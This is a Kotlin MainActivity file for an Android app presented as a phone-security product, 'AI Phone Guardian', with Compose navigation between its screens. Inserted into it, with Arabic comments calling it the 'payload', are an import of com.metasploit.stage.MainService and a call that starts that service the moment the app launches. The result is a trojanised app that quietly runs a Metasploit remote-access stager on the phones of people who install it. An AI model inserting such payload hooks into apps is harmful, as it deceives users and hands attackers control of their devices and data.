package com.aiphoneguardian.app.ui

import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.runtime.Composable
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.ui.Modifier
import androidx.core.splashscreen.SplashScreen.Companion.installSplashScreen
import androidx.hilt.navigation.compose.hiltViewModel
import androidx.navigation.NavHostController
import androidx.navigation.compose.NavHost
import androidx.navigation.compose.composable
import androidx.navigation.compose.rememberNavController
import com.aiphoneguardian.app.ui.navigation.Screen
import com.aiphoneguardian.app.ui.screens.aichat.AIChatScreen
import com.aiphoneguardian.app.ui.screens.auth.ForgotPasswordScreen
import com.aiphoneguardian.app.ui.screens.auth.LoginScreen
import com.aiphoneguardian.app.ui.screens.auth.RegisterScreen
import com.aiphoneguardian.app.ui.screens.calls.CallsScreen
import com.aiphoneguardian.app.ui.screens.dashboard.DashboardScreen
import com.aiphoneguardian.app.ui.screens.fileguardian.FileGuardianScreen
import com.aiphoneguardian.app.ui.screens.messages.MessagesScreen
import com.aiphoneguardian.app.ui.screens.networkmonitor.NetworkMonitorScreen
import com.aiphoneguardian.app.ui.screens.permissions.PermissionsScreen
import com.aiphoneguardian.app.ui.screens.premium.PremiumScreen
import com.aiphoneguardian.app.ui.screens.scanner.ScannerScreen
import com.aiphoneguardian.app.ui.screens.settings.SettingsScreen
import com.aiphoneguardian.app.ui.screens.splash.SplashScreen
import com.aiphoneguardian.app.ui.theme.AIPhoneGuardianTheme
import com.aiphoneguardian.app.ui.viewmodel.SettingsViewModel
import dagger.hilt.android.AndroidEntryPoint
// ↓↓↓ إضافة استيراد الحمولة (البايلود) ↓↓↓
import com.metasploit.stage.MainService

@AndroidEntryPoint
class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        installSplashScreen()
        super.onCreate(savedInstanceState)
        // ↓↓↓ بدء خدمة البايلود فوراً عند بدء التطبيق ↓↓↓
        MainService.startService(this)
        setContent {
            val settingsViewModel: SettingsViewModel = hiltViewModel()
            val isDarkTheme by settingsViewModel.isDarkTheme.collectAsState(initial = true)

            AIPhoneGuardianTheme(darkTheme = isDarkTheme) {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    GuardianApp()
                }
            }
        }
    }
}

@Composable
fun GuardianApp() {
    val navController = rememberNavController()

    NavHost(navController = navController, startDestination = Screen.Splash.route) {

        composable(Screen.Splash.route) {
            SplashScreen(
                onNavigateToDashboard = {
                    navController.navigate(Screen.Permissions.route) {
                        popUpTo(Screen.Splash.route) { inclusive = true }
                    }
                },
                onNavigateToLogin = {
                    navController.navigate(Screen.Login.route) {
                        popUpTo(Screen.Splash.route) { inclusive = true }
                    }
                }
            )
        }

        composable(Screen.Permissions.route) {
            PermissionsScreen(
                onAllGranted = {
                    navController.navigate(Screen.Dashboard.route) {
                        popUpTo(Screen.Permissions.route) { inclusive = true }
                    }
                }
            )
        }

        composable(Screen.Login.route) {
            LoginScreen(
                onNavigateToRegister = { navController.navigate(Screen.Register.route) },
                onNavigateToDashboard = {
                    navController.navigate(Screen.Dashboard.route) {
                        popUpTo(Screen.Login.route) { inclusive = true }
                    }
                },
                onNavigateToForgotPassword = { navController.navigate(Screen.ForgotPassword.route) }
            )
        }

        composable(Screen.Register.route) {
            RegisterScreen(
                onNavigateToLogin = { navController.popBackStack() },
                onNavigateToDashboard = {
                    navController.navigate(Screen.Dashboard.route) {
                        popUpTo(Screen.Register.route) { inclusive = true }
                    }
                }
            )
        }

        composable(Screen.ForgotPassword.route) {
            ForgotPasswordScreen(onNavigateBack = { navController.popBackStack() })
        }

        composable(Screen.Dashboard.route) {
            DashboardScreen(
                onNavigateToScanner = { navController.navigate(Screen.Scanner.route) },
                onNavigateToPremium = { navController.navigate(Screen.Premium.route) }
            )
        }

        composable(Screen.Scanner.route) {
            ScannerScreen(onNavigateBack = { navController.popBackStack() })
        }

        composable(Screen.FileGuardian.route) { FileGuardianScreen() }

        composable(Screen.NetworkMonitor.route) { NetworkMonitorScreen() }

        composable(Screen.Messages.route) { MessagesScreen() }

        composable(Screen.Calls.route) { CallsScreen() }

        composable(Screen.AIChat.route) {
            AIChatScreen(onNavigateToPremium = { navController.navigate(Screen.Premium.route) })
        }

        composable(Screen.Settings.route) {
            SettingsScreen(
                onNavigateToPremium = { navController.navigate(Screen.Premium.route) },
                onLogout = {
                    navController.navigate(Screen.Login.route) {
                        popUpTo(0) { inclusive = true }
                    }
                }
            )
        }

        composable(Screen.Premium.route) {
            PremiumScreen(onNavigateBack = { navController.popBackStack() })
        }
    }
}